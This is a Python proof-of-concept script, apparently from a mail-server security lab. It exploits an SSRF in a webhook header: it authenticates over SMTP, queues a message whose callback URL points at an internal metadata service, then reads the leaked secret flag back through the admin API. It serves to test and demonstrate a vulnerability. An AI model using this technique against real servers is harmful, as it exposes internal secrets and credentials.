#!/usr/bin/env python3
"""
PoC #8: SSRF via the X-Notify-Webhook delivery-status callback
-------------------------------------------------------------------
Location: webhook.fireWebhook() in src/webhook.js, invoked from
finishData() in src/smtp.js whenever a queued message carries an
`X-Notify-Webhook: <url>` header (and the session authenticated). fireWebhook() does `new URL(rawUrl)` and POSTs to it
directly - there is no scheme/host allow-list, no block on internal/
link-local ranges, nothing. The server will fetch whatever URL a client asks
it to, from wherever the server itself sits on the network - a textbook
webhook/DSN-callback SSRF (mirrors the admin-import SSRF in DNSM and the
convert-url SSRF in IPM, but the trigger here is ordinary mail content, not
an admin endpoint).

This feature is gated behind `this.authenticated` (only "trusted" senders
may request a callback), so the PoC authenticates with a normal credential
first; the bug is what an authenticated sender can then make MTA fetch.

How this proves it, purely over the network: authenticate normally, queue a
message with X-Notify-Webhook pointed at the shared fleet metadata service
(`metadata:9000/secret/mta`, see ../../metadata-service) this script cannot
reach directly (in the Docker compose it sits on a `backend` network the `poc`
container isn't attached to), then read the queued message back via the admin
API and confirm the metadata service's secret response body was captured -
proving MTA fetched it on our behalf. That body carries this deployment's real
MTA_FLAG (the metadata service reads it from the environment, the same runtime
secret PoC #7 targets - see entrypoint.sh / generate-secrets.sh), so the
disclosure is scored against a genuine per-deployment value, not a string
hardcoded in the repo.

Run: python3 08_webhook_ssrf.py [host] [port] [admin_port] [metadata_url] [expected_flag]

If expected_flag is omitted it is read from the MTA_FLAG environment variable,
falling back to the repo's local-dev default.

Credentials (env, matching the vuln_tests compose fixture - see its
comments): MTA_TEST_AUTH_USER / MTA_TEST_AUTH_PASS, defaulting to the
zero-setup local-dev fallback "relay"/"relay123" if unset.
"""
import base64
import json
import os
import socket
import sys
import time
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
INTERNAL_URL = sys.argv[4] if len(sys.argv) > 4 else "http://metadata:9000/secret/mta"
EXPECTED_FLAG = (sys.argv[5] if len(sys.argv) > 5
                 else os.environ.get("MTA_FLAG", "FLAG{local-dev-default}"))
SECRET_HINT = "internal-secret"

AUTH_USER = os.environ.get("MTA_TEST_AUTH_USER", "relay")
AUTH_PASS = os.environ.get("MTA_TEST_AUTH_PASS", "relay123")


def read_reply(sock, timeout=10):
    sock.settimeout(timeout)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line, timeout=10):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock, timeout)


def reachable_directly(url):
    try:
        urllib.request.urlopen(url, timeout=3).read()
        return True
    except Exception:
        return False


def main():
    if reachable_directly(INTERNAL_URL):
        print(f"[!] note: {INTERNAL_URL} is directly reachable from here; SSRF is still demonstrated "
              f"below, but network isolation would make it starker")
    else:
        print(f"[*] {INTERNAL_URL} is NOT directly reachable from here - good")

    sock = socket.create_connection((HOST, PORT), timeout=10)
    read_reply(sock)
    cmd(sock, "EHLO poc.example")

    creds = base64.b64encode(f"\0{AUTH_USER}\0{AUTH_PASS}".encode()).decode()
    r = cmd(sock, f"AUTH PLAIN {creds}")
    if not r.startswith("235"):
        print(f"[-] Could not authenticate: {r.strip()}")
        return 1

    cmd(sock, "MAIL FROM:<a@b.example>")
    cmd(sock, "RCPT TO:<x@y.example>")
    r = cmd(sock, "DATA")
    if not r.startswith("354"):
        print(f"[-] DATA rejected: {r.strip()}")
        return 1
    r = cmd(sock, f"Subject: webhook ssrf poc\r\nX-Notify-Webhook: {INTERNAL_URL}\r\n\r\nbody\r\n.")
    print(f"[*] final DATA response -> {r.strip()}")
    sock.close()

    if "queued as" not in r:
        print("[-] message was not queued")
        return 1
    name = r.strip().split("queued as")[-1].strip()

    for _ in range(20):
        detail = json.loads(urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue/{name}", timeout=10).read())
        webhook_result = detail.get("webhook")
        if webhook_result:
            break
        time.sleep(0.5)
    else:
        print("[-] Webhook result never appeared - callback may not have fired")
        return 1

    print(f"[*] Webhook result recorded by MTA: {webhook_result}")
    body = webhook_result.get("body", "")
    if EXPECTED_FLAG in body:
        leaked = next((l.strip() for l in body.splitlines() if SECRET_HINT in l), "?")
        print(f"[+] SSRF confirmed: MTA fetched the internal-only URL on our behalf and leaked "
              f"this deployment's real secret {EXPECTED_FLAG!r} (line: {leaked!r}), captured and "
              f"read back purely over the network")
        return 0

    print(f"[-] expected flag {EXPECTED_FLAG!r} not present in the captured webhook response; SSRF "
          f"may be blocked, or MTA_FLAG doesn't match the running deployment")
    print("    captured body was:", body[:200])
    return 1


if __name__ == "__main__":
    sys.exit(main())
